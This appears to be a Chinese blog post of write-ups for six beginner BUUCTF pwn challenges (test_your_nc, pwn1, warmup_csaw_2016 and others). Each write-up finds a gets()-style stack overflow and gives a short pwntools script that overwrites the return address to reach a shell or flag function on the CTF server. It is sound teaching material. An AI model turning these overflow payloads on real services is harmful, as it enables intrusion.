<!--yml
category: 未分类
date: 2022-04-26 14:53:50
-->

# buuctf pwn刷题（1）_qingmu-z的博客-CSDN博客_buuctf pwn1

> 来源：[https://blog.csdn.net/weixin_42689613/article/details/113432007](https://blog.csdn.net/weixin_42689613/article/details/113432007)

# 1.test_your_nc

先用exeinfo查壳，是64位的程序
![在这里插入图片描述](img/4907286b1798c169e99bec0f9279bc07.png)

用64位ida静态分析一下，找到main函数
![在这里插入图片描述](img/7669aca6c9aa65870079c26680837bce.png)
F5反汇编，看到system("/bin/sh")
`system()的作用———执行shell命令也就是向dos发送一条指令。`
即执行/bin/sh命令，获得shell权限
![在这里插入图片描述](img/ee150a2bbf1c3887999af7f4683d0a9f.png)
![在这里插入图片描述](img/5dad186efaa07c121fc41212d67e682d.png)
用虚拟机连node3.buuoj.cn:27191
`nc node3.buuoj.cn 27191`
查看文件目录
`ls`
查看flag中的内容
`cat flag`
![在这里插入图片描述](img/880c73bb3064dbb7d6355ea0d41832ce.png)

# 2.pwn1

查壳，64位程序
![在这里插入图片描述](img/0aac7b1b4f41866c0a598e5a3b1e941d.png)
用虚拟机看一下有什么保护
![在这里插入图片描述](img/24e7ed2b078c9cd82283cf7e6ed58a31.png)

64位ida静态分析，看一看main函数以及有特殊含义的函数
发现main函数中有gets()函数，所以有栈溢出漏洞
`gets()函数可以输入无限长度的字符，所以容易超出系统分配的栈的最大长度。而在调用函数时栈中存有调用函数之后的命令的地址，所以只要将原本应该返回的地址覆盖掉，就能让程序进入fun函数，从而得到权限。`
![在这里插入图片描述](img/c9b19a53fd54baa9a5c776dd42f8eaab.png)
发现fun函数可以获得shell权限，那么只要让程序执行fun函数即可
![在这里插入图片描述](img/628cdb3818d39edf8b92c8430b9d091d.png)
进入到gets函数的s中
![在这里插入图片描述](img/dce8560b55fff28295aa73ad2442dd88.png)
我们要将阴影部分填充入垃圾数据，在发送fun所在地址到r即可
![在这里插入图片描述](img/1db781aeaaa74b78a60018b552dbeba1.png)
脚本

```
 from pwn import*

context(os="linux",arch="amd64",log_level="debug")

zdb=remote("node3.buuoj.cn",29798)

payload=b'a'*(0x0f-0x00+8)+p64(0x040118a)

zdb.sendline(payload)
zdb.interactive() 
```

# 3.warmup_csaw_2016

file
checksec
![在这里插入图片描述](img/f89ba3be88238813221859e7cbdcea1a.png)
ida64
有gets函数栈溢出漏洞
![在这里插入图片描述](img/f5e6ef8cbfbd29c9d4256fcefbfe886c.png)
进入sub_40060D中发现
![在这里插入图片描述](img/464883d63ccd2c7ddc40cf1718182f43.png)
运行一下程序
程序直接把system地址打印出来了,直接用就可以
![在这里插入图片描述](img/af088b241cea7c1f1851d3b96696ca5e.png)
脚本

```
 from pwn import*
context(os="linux",arch="amd64",log_level="debug")

zdb=remote("node3.buuoj.cn",29734)

payload=b'a'*(0x40+8)+p64(0x40060d)

zdb.recvuntil(">")
zdb.sendline(payload)
zdb.interactive() 
```

# 4.pwn1_sctf_2016

file checksec，32位，没有栈溢出保护
![在这里插入图片描述](img/c6f5f61b56d017e7ad796eb4d7d85543.png)
ida32
找到得到flag的地方
![在这里插入图片描述](img/c91a1b5ba9b5c16ed8e58d2f2bf26d5c.png)
![在这里插入图片描述](img/9950717c153f3cfa4e2443de9e7b0f0f.png)
fgets 输入32位以内的字符串，点进去s，发现32位无法溢出。往下看，有you，I，replace函数猜测是将I替换为you，导致溢出
![在这里插入图片描述](img/ea11596b19f1ee82c746e156378972c5.png)
脚本

```
 from pwn import*
context(os="linux",arch="i386",log_level="debug")

zdb=remote("node3.buuoj.cn",29353)

payload=b'I'*20+b'a'*4+p32(0x8048F0D)

zdb.sendline(payload)
zdb.interactive() 
```

# 5.ciscn_2019_n_1

file checksec
![在这里插入图片描述](img/7447a265885746be382e075e71a3bb7c.png)
ida64 进入main函数中的func函数，有gets()即栈溢出漏洞，还给了system（cat flag）
![在这里插入图片描述](img/97f43c22ce52e2228e74eb75cbb5f905.png)
所以只需要溢出，然后返回到system（cat flag）处地址即可
![在这里插入图片描述](img/876df18f5ca4365b81bd926163b41b42.png)

脚本

```
 from pwn import*
context(os="linux",arch="amd64",log_level="debug")
zdb=remote("node3.buuoj.cn",26842)
payload=b'a'*(0x30+8)+p64(0x004006BE)
zdb.recvuntil("Let's guess the number.\n")
zdb.sendline(payload)
zdb.interactive() 
```

# 6.level0

file checksec
![在这里插入图片描述](img/0817ef0ec1ffcfea5f032c27f945db7a.png)
ida64
注意vuln()或者vulnerable()函数一般是ida认为有漏洞的函数
vulnerable：易受攻击的
![在这里插入图片描述](img/eb913bd121decd9525663d2c62ecc352.png)

![在这里插入图片描述](img/e5f734d09e024379069d0abe977665ea.png)
可以栈溢出
callsystem函数可以得到shell
![在这里插入图片描述](img/351f1031709a12f7175ae0706a61e2ba.png)
脚本

```
 from pwn import*
context(os="linux",arch="amd64",log_level="debug")
zdb=remote("node3.buuoj.cn",27190)
payload=b'a'*(0x80-0x00+8)+p64(0x40059A)
zdb.sendlineafter("Hello, World\n",payload)
zdb.interactive() 
```